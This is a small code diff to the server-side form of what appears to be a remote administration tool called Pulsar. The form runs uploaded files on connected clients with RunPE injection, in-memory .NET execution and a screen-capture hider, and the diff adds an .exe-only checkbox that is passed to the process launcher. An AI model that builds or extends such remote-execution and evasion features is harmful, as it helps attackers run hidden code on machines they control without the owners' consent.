@@ -52,7 +52,7 @@ namespace Pulsar.Server.Forms
             cmbRunPETarget.SelectedIndex = 0;
 
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             foreach (var client in clients)
             {
@@ -190,10 +190,14 @@ namespace Pulsar.Server.Forms
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
                     txtPath.Text = ofd.FileName;
+
+                    // Show checkbox1 only for .exe
+                    checkBox1.Visible =
+                        string.Equals(Path.GetExtension(ofd.FileName), ".exe", StringComparison.OrdinalIgnoreCase);
                 }
             }
-
         }
+
 
         private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
         {
@@ -225,7 +229,16 @@ namespace Pulsar.Server.Forms
                     if (transfer.Status == "Completed")
                     {
                         var pathToStart = transfer.Type == Enums.TransferType.Upload ? transfer.LocalPath : transfer.RemotePath;
-                        handler.TaskHandler.StartProcess(pathToStart, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
+                        handler.TaskHandler.StartProcess(
+                            pathToStart,
+                            _isUpdate,
+                            _executeInMemoryDotNet,
+                            _useRunPE,
+                            _runPETarget,
+                            _runPECustomPath,
+                            checkBox1.Checked
+                        );
+
                     }
                     return;
                 }
@@ -332,6 +345,11 @@ namespace Pulsar.Server.Forms
                 }
             }
 
+
+        }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
 
         }
     }
